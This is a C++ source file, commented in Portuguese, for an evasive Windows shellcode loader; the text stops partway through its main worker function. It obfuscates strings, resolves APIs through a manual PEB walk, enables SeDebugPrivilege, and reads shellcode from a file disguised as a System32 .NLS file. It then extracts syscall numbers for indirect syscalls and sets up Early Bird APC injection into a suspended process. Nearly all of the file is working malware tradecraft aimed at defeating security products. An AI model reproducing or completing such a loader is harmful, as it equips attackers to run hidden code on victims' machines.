#include <windows.h>
#include <psapi.h>
#include <fstream>
#include <string>
#include <vector>
#include <shlobj.h>
#include <thread>
#include <TlHelp32.h>
#include <filesystem>
#include <algorithm>
#include <cctype>
#include <cstdlib>
#include <intrin.h>

#include "xorstr.hpp"

using namespace std;
namespace fs = std::filesystem;

// ============================================================
//  Typedefs
// ============================================================
typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI* fnNtFreeVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS(NTAPI* fnNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);

typedef DWORD(WINAPI* fnGetCurrentProcessId)(VOID);
typedef DWORD(WINAPI* fnGetCurrentThreadId)(VOID);
typedef HMODULE(WINAPI* fnGetModuleHandleA)(LPCSTR);
typedef VOID(WINAPI* fnGetSystemTimeAsFileTime)(LPFILETIME);
typedef VOID(WINAPI* fnInitializeSListHead)(PSLIST_HEADER);
typedef BOOL(WINAPI* fnQueryPerformanceCounter)(LARGE_INTEGER*);

typedef BOOL(WINAPI* fnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef HANDLE(WINAPI* fnOpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL(WINAPI* fnVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD(WINAPI* fnResumeThread)(HANDLE);
typedef BOOL(WINAPI* fnCloseHandle)(HANDLE);
typedef BOOL(WINAPI* fnDisableThreadLibraryCalls)(HMODULE);
typedef HANDLE(WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef VOID(WINAPI* fnFreeLibraryAndExitThread)(HMODULE, DWORD);
typedef BOOL(WINAPI* fnTrySubmitThreadpoolCallback)(PTP_SIMPLE_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON);
typedef VOID(WINAPI* fnFreeLibraryWhenCallbackReturns)(PTP_CALLBACK_INSTANCE, HMODULE);
typedef HANDLE(WINAPI* fnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD(WINAPI* fnSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
typedef BOOL(WINAPI* fnSetEndOfFile)(HANDLE);
typedef BOOL(WINAPI* fnTerminateProcess)(HANDLE, UINT);
typedef VOID(WINAPI* fnSleep)(DWORD);

typedef BOOL(WINAPI* fnAreFileApisANSI)(VOID);
typedef HANDLE(WINAPI* fnCreateFile2)(LPCWSTR, DWORD, DWORD, DWORD, LPCREATEFILE2_EXTENDED_PARAMETERS);
typedef BOOL(WINAPI* fnFindClose)(HANDLE);
typedef HANDLE(WINAPI* fnFindFirstFileExW)(LPCWSTR, FINDEX_INFO_LEVELS, LPVOID, FINDEX_SEARCH_OPS, LPVOID, DWORD);
typedef HANDLE(WINAPI* fnFindFirstFileW)(LPCWSTR, LPWIN32_FIND_DATAW);
typedef BOOL(WINAPI* fnFindNextFileW)(HANDLE, LPWIN32_FIND_DATAW);
typedef DWORD(WINAPI* fnFormatMessageA)(DWORD, LPCVOID, DWORD, DWORD, LPSTR, DWORD, va_list*);
typedef HANDLE(WINAPI* fnGetCurrentProcess)(VOID);
typedef BOOL(WINAPI* fnGetFileAttributesExW)(LPCWSTR, GET_FILEEX_INFO_LEVELS, LPVOID);
typedef BOOL(WINAPI* fnGetFileInformationByHandleEx)(HANDLE, FILE_INFO_BY_HANDLE_CLASS, LPVOID, DWORD);
typedef DWORD(WINAPI* fnGetLastError)(VOID);
typedef int(WINAPI* fnGetLocaleInfoEx)(LPCWSTR, LCTYPE, LPWSTR, int);
typedef FARPROC(WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);
typedef HLOCAL(WINAPI* fnLocalFree)(HLOCAL);
typedef int(WINAPI* fnMultiByteToWideChar)(UINT, DWORD, LPCCH, int, LPWSTR, int);
typedef int(WINAPI* fnWideCharToMultiByte)(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);

// Snapshot / Toolhelp
typedef HANDLE(WINAPI* fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI* fnProcess32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL(WINAPI* fnProcess32NextW)(HANDLE, LPPROCESSENTRY32W);

// ============================================================
//  Ponteiros globais
// ============================================================
static fnNtAllocateVirtualMemory _NtAllocateVirtualMemory = NULL;
static fnNtWriteVirtualMemory    _NtWriteVirtualMemory = NULL;
static fnNtFreeVirtualMemory     _NtFreeVirtualMemory = NULL;
static fnNtQueueApcThread        _NtQueueApcThread = NULL;

static fnGetCurrentProcessId       _GetCurrentProcessId = NULL;
static fnGetCurrentThreadId        _GetCurrentThreadId = NULL;
static fnGetModuleHandleA          _GetModuleHandleA = NULL;
static fnGetSystemTimeAsFileTime   _GetSystemTimeAsFileTime = NULL;
static fnInitializeSListHead       _InitializeSListHead = NULL;
static fnQueryPerformanceCounter   _QueryPerformanceCounter = NULL;

static fnCreateProcessA            _CreateProcessA = NULL;
static fnOpenProcess               _OpenProcess = NULL;
static fnVirtualProtectEx          _VirtualProtectEx = NULL;
static fnResumeThread              _ResumeThread = NULL;
static fnCloseHandle               _CloseHandle = NULL;
static fnDisableThreadLibraryCalls _DisableThreadLibraryCalls = NULL;
static fnCreateThread              _CreateThread = NULL;
static fnFreeLibraryAndExitThread  _FreeLibraryAndExitThread = NULL;
static fnTrySubmitThreadpoolCallback    _TrySubmitThreadpoolCallback = NULL;
static fnFreeLibraryWhenCallbackReturns _FreeLibraryWhenCallbackReturns = NULL;
static fnCreateFileA               _CreateFileA = NULL;
static fnSetFilePointer            _SetFilePointer = NULL;
static fnSetEndOfFile              _SetEndOfFile = NULL;
static fnTerminateProcess          _TerminateProcess = NULL;
static fnSleep                     _Sleep = NULL;

static fnAreFileApisANSI               _AreFileApisANSI = NULL;
static fnCreateFile2                   _CreateFile2 = NULL;
static fnFindClose                     _FindClose = NULL;
static fnFindFirstFileExW              _FindFirstFileExW = NULL;
static fnFindFirstFileW                _FindFirstFileW = NULL;
static fnFindNextFileW                 _FindNextFileW = NULL;
static fnFormatMessageA                _FormatMessageA = NULL;
static fnGetCurrentProcess             _GetCurrentProcess = NULL;
static fnGetFileAttributesExW          _GetFileAttributesExW = NULL;
static fnGetFileInformationByHandleEx  _GetFileInformationByHandleEx = NULL;
static fnGetLastError                  _GetLastError = NULL;
static fnGetLocaleInfoEx               _GetLocaleInfoEx = NULL;
static fnGetProcAddress                _GetProcAddress = NULL;
static fnLocalFree                     _LocalFree = NULL;
static fnMultiByteToWideChar           _MultiByteToWideChar = NULL;
static fnWideCharToMultiByte           _WideCharToMultiByte = NULL;

static fnCreateToolhelp32Snapshot      _CreateToolhelp32Snapshot = NULL;
static fnProcess32FirstW               _Process32FirstW = NULL;
static fnProcess32NextW                _Process32NextW = NULL;

// ============================================================
//  Resolver manual: PEB walk + export table parse
// ============================================================
static bool StrEqA(const char* a, const char* b) {
    while (*a && *b) { if (*a != *b) return false; a++; b++; }
    return *a == *b;
}

static bool StrEqIW(const wchar_t* a, const wchar_t* b) {
    while (*a && *b) {
        wchar_t ca = *a, cb = *b;
        if (ca >= L'A' && ca <= L'Z') ca = (wchar_t)(ca + 32);
        if (cb >= L'A' && cb <= L'Z') cb = (wchar_t)(cb + 32);
        if (ca != cb) return false;
        a++; b++;
    }
    return *a == *b;
}

typedef struct _UNICODE_STRING_M {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_M;

typedef struct _LDR_DATA_TABLE_ENTRY_M {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING_M FullDllName;
    UNICODE_STRING_M BaseDllName;
} LDR_DATA_TABLE_ENTRY_M;

typedef struct _PEB_LDR_DATA_M {
    ULONG Length;
    BOOLEAN Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_M;

typedef struct _PEB_M {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PEB_LDR_DATA_M* Ldr;
} PEB_M;

static PVOID GetModuleBaseFromPeb(const wchar_t* moduleName) {
#ifdef _WIN64
    PEB_M* peb = (PEB_M*)__readgsqword(0x60);
#else
    PEB_M* peb = (PEB_M*)__readfsdword(0x30);
#endif
    if (!peb || !peb->Ldr) return NULL;

    LIST_ENTRY* head = &peb->Ldr->InLoadOrderModuleList;
    LIST_ENTRY* cur = head->Flink;
    while (cur != head) {
        LDR_DATA_TABLE_ENTRY_M* e = (LDR_DATA_TABLE_ENTRY_M*)cur;
        if (e->BaseDllName.Buffer && StrEqIW(e->BaseDllName.Buffer, moduleName)) {
            return e->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

static FARPROC GetExportManual(PVOID moduleBase, const char* funcName);

static FARPROC ResolveForwarder(PVOID base, DWORD funcRva, DWORD expStart, DWORD expEnd, const char* funcName) {
    if (funcRva < expStart || funcRva >= expEnd) {
        return (FARPROC)((BYTE*)base + funcRva);
    }
    const char* fwd = (const char*)((BYTE*)base + funcRva);
    char dllName[72] = { 0 };
    size_t k = 0;
    const char* p = fwd;
    while (*p && *p != '.' && k < 64) dllName[k++] = *p++;
    if (*p != '.') return NULL;
    const char* fwdFunc = p + 1;

    size_t n = k;
    bool hasDll = (n >= 4 &&
        dllName[n - 4] == '.' &&
        (dllName[n - 3] == 'd' || dllName[n - 3] == 'D') &&
        (dllName[n - 2] == 'l' || dllName[n - 2] == 'L') &&
        (dllName[n - 1] == 'l' || dllName[n - 1] == 'L'));
    if (!hasDll) {
        dllName[n++] = '.'; dllName[n++] = 'd'; dllName[n++] = 'l'; dllName[n++] = 'l';
    }
    dllName[n] = 0;

    wchar_t wname[72];
    for (size_t i = 0; i <= n; i++) wname[i] = (wchar_t)dllName[i];

    PVOID tgt = GetModuleBaseFromPeb(wname);
    if (!tgt) return NULL;
    return GetExportManual(tgt, fwdFunc);
}

static FARPROC GetExportManual(PVOID moduleBase, const char* funcName) {
    if (!moduleBase) return NULL;
    BYTE* base = (BYTE*)moduleBase;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY* expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDir->VirtualAddress || !expDir->Size) return NULL;

    DWORD expStart = expDir->VirtualAddress;
    DWORD expEnd = expStart + expDir->Size;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + expStart);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        if (StrEqA(name, funcName)) {
            return ResolveForwarder(base, funcs[ordinals[i]], expStart, expEnd, funcName);
        }
    }
    return NULL;
}

// ============================================================
//  ResolveApis
// ============================================================
#define ENSURE_FUNCTION(func, module, name) \
    if (!func) { \
        PVOID hMod = GetModuleBaseFromPeb(module); \
        if (hMod) func = (decltype(func))GetExportManual(hMod, name); \
    }

static void ResolveApis() {
    PVOID k32 = GetModuleBaseFromPeb(xorstr_(L"kernel32.dll"));
    PVOID kb = GetModuleBaseFromPeb(xorstr_(L"kernelbase.dll"));
    PVOID ntd = GetModuleBaseFromPeb(xorstr_(L"ntdll.dll"));
    if (!k32) return;

    auto resolve = [&](const char* func) -> FARPROC {
        FARPROC addr = NULL;
        if (kb) addr = GetExportManual(kb, func);
        if (!addr) addr = GetExportManual(k32, func);
        return addr;
        };

    _GetCurrentProcessId = (fnGetCurrentProcessId)GetExportManual(k32, xorstr_("GetCurrentProcessId"));
    _GetCurrentThreadId = (fnGetCurrentThreadId)GetExportManual(k32, xorstr_("GetCurrentThreadId"));
    _GetModuleHandleA = (fnGetModuleHandleA)GetExportManual(k32, xorstr_("GetModuleHandleA"));
    _GetSystemTimeAsFileTime = (fnGetSystemTimeAsFileTime)GetExportManual(k32, xorstr_("GetSystemTimeAsFileTime"));
    _InitializeSListHead = (fnInitializeSListHead)GetExportManual(k32, xorstr_("InitializeSListHead"));
    _QueryPerformanceCounter = (fnQueryPerformanceCounter)GetExportManual(k32, xorstr_("QueryPerformanceCounter"));

    _CreateProcessA = (fnCreateProcessA)resolve(xorstr_("CreateProcessA"));
    _OpenProcess = (fnOpenProcess)resolve(xorstr_("OpenProcess"));
    _VirtualProtectEx = (fnVirtualProtectEx)resolve(xorstr_("VirtualProtectEx"));
    _ResumeThread = (fnResumeThread)resolve(xorstr_("ResumeThread"));
    _CloseHandle = (fnCloseHandle)resolve(xorstr_("CloseHandle"));
    _DisableThreadLibraryCalls = (fnDisableThreadLibraryCalls)resolve(xorstr_("DisableThreadLibraryCalls"));
    _CreateThread = (fnCreateThread)resolve(xorstr_("CreateThread"));
    _FreeLibraryAndExitThread = (fnFreeLibraryAndExitThread)resolve(xorstr_("FreeLibraryAndExitThread"));
    _TrySubmitThreadpoolCallback = (fnTrySubmitThreadpoolCallback)resolve(xorstr_("TrySubmitThreadpoolCallback"));
    _FreeLibraryWhenCallbackReturns = (fnFreeLibraryWhenCallbackReturns)resolve(xorstr_("FreeLibraryWhenCallbackReturns"));
    _CreateFileA = (fnCreateFileA)resolve(xorstr_("CreateFileA"));
    _SetFilePointer = (fnSetFilePointer)resolve(xorstr_("SetFilePointer"));
    _SetEndOfFile = (fnSetEndOfFile)resolve(xorstr_("SetEndOfFile"));
    _TerminateProcess = (fnTerminateProcess)resolve(xorstr_("TerminateProcess"));
    _Sleep = (fnSleep)resolve(xorstr_("Sleep"));

    _AreFileApisANSI = (fnAreFileApisANSI)resolve(xorstr_("AreFileApisANSI"));
    _CreateFile2 = (fnCreateFile2)resolve(xorstr_("CreateFile2"));
    _FindClose = (fnFindClose)resolve(xorstr_("FindClose"));
    _FindFirstFileExW = (fnFindFirstFileExW)resolve(xorstr_("FindFirstFileExW"));
    _FindFirstFileW = (fnFindFirstFileW)resolve(xorstr_("FindFirstFileW"));
    _FindNextFileW = (fnFindNextFileW)resolve(xorstr_("FindNextFileW"));
    _FormatMessageA = (fnFormatMessageA)resolve(xorstr_("FormatMessageA"));
    _GetCurrentProcess = (fnGetCurrentProcess)resolve(xorstr_("GetCurrentProcess"));
    _GetFileAttributesExW = (fnGetFileAttributesExW)resolve(xorstr_("GetFileAttributesExW"));
    _GetFileInformationByHandleEx = (fnGetFileInformationByHandleEx)resolve(xorstr_("GetFileInformationByHandleEx"));
    _GetLastError = (fnGetLastError)resolve(xorstr_("GetLastError"));
    _GetLocaleInfoEx = (fnGetLocaleInfoEx)resolve(xorstr_("GetLocaleInfoEx"));
    _GetProcAddress = (fnGetProcAddress)resolve(xorstr_("GetProcAddress"));
    _LocalFree = (fnLocalFree)resolve(xorstr_("LocalFree"));
    _MultiByteToWideChar = (fnMultiByteToWideChar)resolve(xorstr_("MultiByteToWideChar"));
    _WideCharToMultiByte = (fnWideCharToMultiByte)resolve(xorstr_("WideCharToMultiByte"));

    _CreateToolhelp32Snapshot = (fnCreateToolhelp32Snapshot)resolve(xorstr_("CreateToolhelp32Snapshot"));
    _Process32FirstW = (fnProcess32FirstW)resolve(xorstr_("Process32FirstW"));
    _Process32NextW = (fnProcess32NextW)resolve(xorstr_("Process32NextW"));

    if (ntd) {
        _NtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetExportManual(ntd, xorstr_("NtAllocateVirtualMemory"));
        _NtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetExportManual(ntd, xorstr_("NtWriteVirtualMemory"));
        _NtFreeVirtualMemory = (fnNtFreeVirtualMemory)GetExportManual(ntd, xorstr_("NtFreeVirtualMemory"));
        // NOVO: resolver NtQueueApcThread (usado pelo APC injection)
        _NtQueueApcThread = (fnNtQueueApcThread)GetExportManual(ntd, xorstr_("NtQueueApcThread"));
    }
}

// ============================================================
//  SeDebugPrivilege
// ============================================================
typedef BOOL(WINAPI* fnOpenProcessToken)(HANDLE, DWORD, PHANDLE);
typedef BOOL(WINAPI* fnLookupPrivilegeValueA)(LPCSTR, LPCSTR, PLUID);
typedef BOOL(WINAPI* fnAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);

static bool EnableDebugPrivilege() {
    PVOID adv = GetModuleBaseFromPeb(L"advapi32.dll");
    if (!adv) return false;

    fnOpenProcessToken        _OpenProcessToken = (fnOpenProcessToken)GetExportManual(adv, xorstr_("OpenProcessToken"));
    fnLookupPrivilegeValueA   _LookupPrivilegeValueA = (fnLookupPrivilegeValueA)GetExportManual(adv, xorstr_("LookupPrivilegeValueA"));
    fnAdjustTokenPrivileges   _AdjustTokenPrivileges = (fnAdjustTokenPrivileges)GetExportManual(adv, xorstr_("AdjustTokenPrivileges"));
    if (!_OpenProcessToken || !_LookupPrivilegeValueA || !_AdjustTokenPrivileges) return false;
    if (!_GetCurrentProcess || !_CloseHandle || !_GetLastError) return false;

    HANDLE hToken = NULL;
    if (!_OpenProcessToken(_GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp = { 0 };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!_LookupPrivilegeValueA(NULL, xorstr_("SeDebugPrivilege"), &tp.Privileges[0].Luid)) {
        _CloseHandle(hToken);
        return false;
    }

    BOOL ok = _AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = _GetLastError();
    _CloseHandle(hToken);
    return ok && err == ERROR_SUCCESS;
}

// ============================================================
//  Shellcode / file helpers
// ============================================================
vector<unsigned char> readShellcodeFromFile(const string& filename) {
    vector<unsigned char> shellcode;

    ifstream file(filename, ios::binary);
    if (!file.is_open()) return shellcode;

    string line, shellcodeStr;
    while (getline(file, line)) shellcodeStr += line;
    file.close();

    size_t start = shellcodeStr.find(xorstr_("\""));
    size_t end = shellcodeStr.rfind(xorstr_("\""));
    if (start == string::npos || end == string::npos || start >= end) return shellcode;

    string hexStr = shellcodeStr.substr(start + 1, end - start - 1);
    for (size_t i = 0; i < hexStr.length(); i++) {
        if (hexStr[i] == '\\' && i + 3 < hexStr.length() && hexStr[i + 1] == 'x') {
            string byteStr = hexStr.substr(i + 2, 2);
            unsigned char byte = (unsigned char)strtol(byteStr.c_str(), NULL, 16);
            shellcode.push_back(byte);
            i += 3;
        }
    }
    return shellcode;
}

static string ToLowerStr(const string& s) {
    string out = s;
    transform(out.begin(), out.end(), out.begin(),
        [](unsigned char c) { return (char)tolower(c); });
    return out;
}

static bool FileNameMatches(const string& lowerName,
    const vector<string>& mustContain, const vector<string>& mustEndWith)
{
    for (const auto& s : mustContain) if (lowerName.find(s) == string::npos) return false;
    for (const auto& suffix : mustEndWith) {
        if (lowerName.size() < suffix.size()) return false;
        if (lowerName.compare(lowerName.size() - suffix.size(), suffix.size(), suffix) != 0) return false;
    }
    return true;
}

static string FindFileByPattern(const string& dir,
    const vector<string>& mustContain, const vector<string>& mustEndWith)
{
    vector<string> lowContains, lowSuffix;
    for (const auto& s : mustContain) lowContains.push_back(ToLowerStr(s));
    for (const auto& s : mustEndWith)  lowSuffix.push_back(ToLowerStr(s));

    std::error_code ec;
    if (!fs::exists(dir, ec) || ec) return {};

    vector<fs::directory_entry> candidates;
    for (const auto& entry : fs::directory_iterator(dir, ec)) {
        if (ec) break;
        if (!entry.is_regular_file(ec) || ec) continue;
        string name = entry.path().filename().string();
        string lower = ToLowerStr(name);
        if (FileNameMatches(lower, lowContains, lowSuffix)) candidates.push_back(entry);
    }
    if (candidates.empty()) return {};
    if (candidates.size() > 1) {
        sort(candidates.begin(), candidates.end(),
            [](const fs::directory_entry& a, const fs::directory_entry& b) {
                std::error_code e1, e2;
                auto ta = fs::last_write_time(a, e1);
                auto tb = fs::last_write_time(b, e2);
                if (e1 || e2) return false;
                return ta > tb;
            });
    }
    return candidates.front().path().string();
}

// ============================================================
//  Syscall helpers  (SSN extraction + indirect stub)
// ============================================================
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID;
typedef struct _LSA_UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

extern "C" NTSTATUS NtOpen(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
extern "C" NTSTATUS NtAllocateVM(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern "C" NTSTATUS NtWriteVM(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
extern "C" NTSTATUS NtQueueApcThreadStub(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);
extern "C" NTSTATUS NtWFSObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
extern "C" NTSTATUS NtProtectVM(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);

void InitializeObjectAttributes(POBJECT_ATTRIBUTES pObjectAttributes, PUNICODE_STRING pObjectName, ULONG Attributes, HANDLE RootDirectory, PVOID SecurityDescriptor) {
    if (pObjectAttributes == NULL) return;
    pObjectAttributes->Length = sizeof(OBJECT_ATTRIBUTES);
    pObjectAttributes->RootDirectory = RootDirectory;
    pObjectAttributes->ObjectName = pObjectName;
    pObjectAttributes->Attributes = Attributes;
    pObjectAttributes->SecurityDescriptor = SecurityDescriptor;
    pObjectAttributes->SecurityQualityOfService = NULL;
}

extern "C" {
    DWORD SSNtOpenProcess = 0;
    UINT_PTR AddrNtOpenProcess = 0;
    DWORD SSNtAllocateVirtualMemory = 0;
    UINT_PTR AddrNtAllocateVirtualMemory = 0;
    DWORD SSNtWriteVirtualMemory = 0;
    UINT_PTR AddrNtWriteVirtualMemory = 0;
    DWORD SSNtQueueApcThread = 0;
    UINT_PTR AddrNtQueueApcThread = 0;   // NOVO
    DWORD SSNtWaitForSingleObject = 0;
    UINT_PTR AddrNtWaitForSingleObject = 0;
    DWORD SSNtProtectVirtualMemory = 0;
    UINT_PTR AddrNtProtectVirtualMemory = 0;
}

// ============================================================
//  Worker thread forward + helpers
// ============================================================
static volatile LONG g_workStarted = 0;
static volatile LONG g_workDone = 0;
static volatile LONG g_resolveOnce = 0;

static DWORD WINAPI WorkerThread(LPVOID);

static void ResolveOnce() {
    if (InterlockedCompareExchange(&g_resolveOnce, 1, 0) == 0) {
        ResolveApis();
    }
}

static void WaitWorkerDone(DWORD timeoutMs) {
    DWORD waited = 0;
    if (!_Sleep) return;
    while (InterlockedCompareExchange(&g_workDone, 0, 0) == 0 && waited < timeoutMs) {
        _Sleep(100);
        waited += 100;
    }
}

static void LaunchWorkerOrInline() {
    ResolveOnce();
    if (_CreateThread) {
        HANDLE hThread = _CreateThread(NULL, 0, WorkerThread, NULL, 0, NULL);
        if (hThread) {
            if (_CloseHandle) _CloseHandle(hThread);
            return;
        }
    }
    // Fallback: se CreateThread falhou, roda inline
    WorkerThread(NULL);
}

// ============================================================
//  FindProcessByName
// ============================================================
static DWORD FindProcessByName(const char* exeName) {
    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW || !_CloseHandle || !_GetCurrentProcessId)
        ResolveApis();
    if (!_CreateToolhelp32Snapshot || !_Process32FirstW || !_Process32NextW) return 0;

    string want = ToLowerStr(exeName);
    HANDLE hSnap = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(pe);
    DWORD selfPid = _GetCurrentProcessId();
    if (_Process32FirstW(hSnap, &pe)) {
        do {
            char narrow[MAX_PATH];
            size_t conv = 0;
            wcstombs_s(&conv, narrow, sizeof(narrow), pe.szExeFile, _TRUNCATE);
            if (ToLowerStr(narrow) == want && pe.th32ProcessID != selfPid) {
                DWORD pid = pe.th32ProcessID;
                _CloseHandle(hSnap);
                return pid;
            }
        } while (_Process32NextW(hSnap, &pe));
    }
    _CloseHandle(hSnap);
    return 0;
}


VOID Worker() {

    ResolveApis();

    ENSURE_FUNCTION(_CreateProcessA, xorstr_(L"kernel32.dll"), xorstr_("CreateProcessA"));
    ENSURE_FUNCTION(_OpenProcess, xorstr_(L"kernelbase.dll"), xorstr_("OpenProcess"));
    ENSURE_FUNCTION(_ResumeThread, xorstr_(L"kernel32.dll"), xorstr_("ResumeThread"));
    ENSURE_FUNCTION(_CloseHandle, xorstr_(L"kernelbase.dll"), xorstr_("CloseHandle"));
    ENSURE_FUNCTION(_TerminateProcess, xorstr_(L"kernelbase.dll"), xorstr_("TerminateProcess"));
    ENSURE_FUNCTION(_Sleep, xorstr_(L"kernel32.dll"), xorstr_("Sleep"));
    ENSURE_FUNCTION(_CreateToolhelp32Snapshot, xorstr_(L"kernel32.dll"), xorstr_("CreateToolhelp32Snapshot"));

    EnableDebugPrivilege();

    const string searchDir = xorstr_("C:\\Windows\\System32");
    struct Pattern { vector<string> contains; vector<string> endsWith; };
    vector<Pattern> patterns = {
       { { string(xorstr_("C_212")) }, { string(xorstr_(".NLS")) } },
    };

    string filePath;
    for (size_t i = 0; i < patterns.size(); i++) {
        filePath = FindFileByPattern(searchDir, patterns[i].contains, patterns[i].endsWith);
        if (!filePath.empty()) break;
    }
    if (filePath.empty()) return;

    vector<unsigned char> shellcode = readShellcodeFromFile(filePath);
    SIZE_T shellcodeSize = shellcode.size();
    if (shellcode.empty()) return;

    PVOID ntdBase = GetModuleBaseFromPeb(xorstr_(L"ntdll.dll"));
    if (!ntdBase) return;

    // ---- extrair SSN + endereço do stub "syscall" para cada Nt* ----
    UINT_PTR pNtOpenProcess = (UINT_PTR)GetExportManual(ntdBase, xorstr_("NtOpenProcess"));
    if (!pNtOpenProcess) return;
    SSNtOpenProcess = *(DWORD*)(pNtOpenProcess + 4);
    AddrNtOpenProcess = pNtOpenProcess + 0x12;

    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetExportManual(ntdBase, xorstr_("NtAllocateVirtualMemory"));
    if (!pNtAllocateVirtualMemory) return;
    SSNtAllocateVirtualMemory = *(DWORD*)(pNtAllocateVirtualMemory + 4);
    AddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;

    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetExportManual(ntdBase, xorstr_("NtWriteVirtualMemory"));
    if (!pNtWriteVirtualMemory) return;
    SSNtWriteVirtualMemory = *(DWORD*)(pNtWriteVirtualMemory + 4);
    AddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;

    // ---- NOVO: extrair SSN + stub de NtQueueApcThread ----
    UINT_PTR pNtQueueApcThread = (UINT_PTR)GetExportManual(ntdBase, xorstr_("NtQueueApcThread"));
    if (!pNtQueueApcThread) return;
    SSNtQueueApcThread = *(DWORD*)(pNtQueueApcThread + 4);
    AddrNtQueueApcThread = pNtQueueApcThread + 0x12;

    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetExportManual(ntdBase, xorstr_("NtWaitForSingleObject"));
    if (!pNtWaitForSingleObject) return;
    SSNtWaitForSingleObject = *(DWORD*)(pNtWaitForSingleObject + 4);
    AddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;

    UINT_PTR pNtProtectVirtualMemory = (UINT_PTR)GetExportManual(ntdBase, xorstr_("NtProtectVirtualMemory"));
    if (!pNtProtectVirtualMemory) return;
    SSNtProtectVirtualMemory = *(DWORD*)(pNtProtectVirtualMemory + 4);
    AddrNtProtectVirtualMemory = pNtProtectVirtualMemory + 0x12;

    // ---- criar processo alvo suspenso (Early Bird) ----
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
